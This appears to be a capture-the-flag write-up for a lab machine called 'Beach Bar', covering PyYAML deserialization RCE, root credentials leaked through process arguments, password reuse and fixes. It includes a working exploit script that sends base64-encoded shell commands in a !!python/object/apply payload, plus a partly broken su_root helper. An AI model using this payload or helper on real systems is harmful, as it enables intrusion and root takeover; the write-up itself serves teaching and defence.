🚀 YAML Deserialization — PyYAML RCE

3.1 Understanding the Vulnerability

Source Code (discovered after RCE):

# /opt/beach-bar/webapp/app.py
@app.route("/import", methods=["GET", "POST"])
@login_required
def import_playlist():
    content = request.form.get('playlist', '')
    # ❌ UNSAFE DESERIALIZATION
    parsed = yaml.load(content, Loader=yaml.Loader)   # <-- VULNERABLE
    return render_template('import.html', parsed=parsed)

Why is this vulnerable? yaml.load() with Loader=yaml.Loader deserializes arbitrary Python objects. This is equivalent to Python's pickle.load().

3.3 The RCE Helper Script (rce.py)

#!/usr/bin/env python3
import sys, subprocess, urllib.request, urllib.parse, base64, re, html

def run(cmd, timeout=25):
    b64 = base64.b64encode(cmd.encode()).decode()
    inner = f"echo {b64} | base64 -d | bash"
    TAG = "!!python/object" + "/apply"
    payload = f'{TAG}:subprocess.check_output [["bash","-c","{inner}"]]'
    data = urllib.parse.urlencode({'playlist': payload}).encode()
    req = urllib.request.Request('http://10.49.163.147/import', data=data, method='POST')
    # Load session cookie
    with open('cookies.txt', 'r') as f:
        for line in f:
            if 'session' in line:
                sess = line.split()[-1]
                req.add_header('Cookie', 'session=' + sess)
                break
    resp = urllib.request.urlopen(req, timeout=timeout)
    body = resp.read().decode(errors='replace')
    m = re.findall(r'<pre>(.*?)</pre>', body, re.S)
    return html.unescape(m[-1]) if m else body

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print("Usage: python3 rce.py '<command>'")
        sys.exit(1)
    print(run(sys.argv[1]))

def su_root(cmd):
    pid, fd = pty.fork()
    if pid == 0:
        os.execv('/bin/su', ['su', '-', 'root', '-c', cmd])
    else:
        buf = b''
        sent = False
        deadline = time.time() + 1.2
        while time.time() < deadline:
            r, _, _ = select.select([fd], [], [], 0.2)
            if r:
                d = os.read(fd, 65536)
                if not d: break
                buf += d

                if not d: break

            pass
        os.close(fd)
        return buf.decode(errors='replace')

🔬 Vulnerability Deep Dive

6.1 CWE-502: Deserialization of Untrusted Data

Python's yaml.load() with Loader=yaml.Loader can instantiate arbitrary Python objects using YAML's !!python/object tags.

How the Exploit Works:

!!python/object/apply:subprocess.check_output [["id"]]

This tells PyYAML to import subprocess, call check_output, and pass ["id"] as an argument.

6.2 CWE-200: Exposure of Sensitive Information

In Linux, every process's command-line arguments are visible via /proc/<pid>/cmdline. Even though jukeboxd.py runs as root, the arguments are world-readable.

🛡️ Remediation Recommendations

7.1 Fix YAML Deserialization

# ❌ UNSAFE (as implemented)
parsed = yaml.load(content, Loader=yaml.Loader)

# ✅ SAFE — use safe_load
parsed = yaml.safe_load(content)

7.2 Remove Credential from Process Arguments

# ❌ UNSAFE — exposes secret to all users
subprocess.Popen(['python', 'jukeboxd.py', '--stream-pass', password])

# ✅ SAFE — read from environment variable
import os
password = os.environ.get('STREAM_PASS')
subprocess.Popen(['python', 'jukeboxd.py', '--bitrate', '320k'])

7.3 Eliminate Password Reuse

# ❌ UNSAFE — same password used in two contexts
STREAM_PASSWORD = "SunsetSpritz2024!"

# ✅ SAFE — separate passwords, stored securely
STREAM_PASSWORD = os.urandom(32).hex()
ROOT_PASSWORD = securely_generate_password()

Beach Bar demonstrates how YAML Deserialization and credential reuse can lead to full system compromise.

Key Takeaways:

  • Never use yaml.load() with untrusted input.
  • Never pass secrets as command-line arguments.
  • Never reuse passwords across different contexts.
